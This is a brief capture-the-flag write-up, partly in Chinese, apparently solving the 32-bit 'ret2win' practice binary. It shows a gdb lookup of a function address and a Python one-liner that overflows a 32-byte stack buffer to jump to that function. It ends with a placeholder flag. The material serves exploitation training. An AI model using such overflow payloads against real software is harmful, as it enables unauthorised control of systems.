## Pwn
列舉一下 functions
```
0x0804857b  main
0x080485f6  pwnme -> fgets(buf, 50, fp) where buf is `char buf[32]`
0x08048659  ret2win
```

查 ret2win() 的位址
```
(gdb) p ret2win
$1 = {<text variable, no debug info>} 0x8048659 <ret2win>
```

完成
```
$ python2 -c 'print 11 * 4 * "A" + "\x59\x86\x04\x08"' | ./ret2win32
```

flag: `ROPE{a_placeholder_32byte_flag!}`
